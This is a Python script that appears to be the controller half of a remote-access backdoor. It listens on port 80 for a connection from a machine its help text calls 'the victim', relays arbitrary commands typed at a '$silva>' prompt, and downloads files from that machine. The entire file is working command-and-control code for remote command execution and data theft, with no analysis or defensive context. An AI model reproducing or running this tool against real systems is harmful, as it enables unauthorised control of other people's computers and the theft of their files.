from socket import *
import os
import sys
import platform
import psutil
import subprocess as sp
import json

def recvfile(filename, socket):
    filedata = socket.recv(1000000)
    f = open(filename, 'wb')
    f.write(filedata)
    f.close()
    print('file downloaded !')

print('Waiting for Recieving Connection...')



server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
ep = ('0.0.0.0', 80)
server.bind(ep)
server.listen(3)
c, a = server.accept() # c for connection
print('connection stablished !!')
msg = str(input('$silva> '))
rb = None
while msg != 'exit':
    try:
        if msg.startswith('get'):
            fn = msg.replace('get ', '')
            c.send(msg.encode('ascii'))
            filedata = c.recv(1000000)
            f = open(fn, 'wb')
            f.write(filedata)
            f.close()
            print('file downloaded !')
        elif msg == 'help':
            print('ip    to get ip address of the victim')
            print('get   to download file')
            print('ps')
            print('connections')
            print('sys')
        else:
            c.send(msg.encode('ascii'))
            rb = c.recv(1000000)
            res = rb.decode('ascii')
            print(res)
    except Exception as e:
        print('the problem is : ' + str(e))
    msg = str(input('$silva> '))

c.send(msg.encode('ascii'))
c.close()
server.close()
sys.exit()
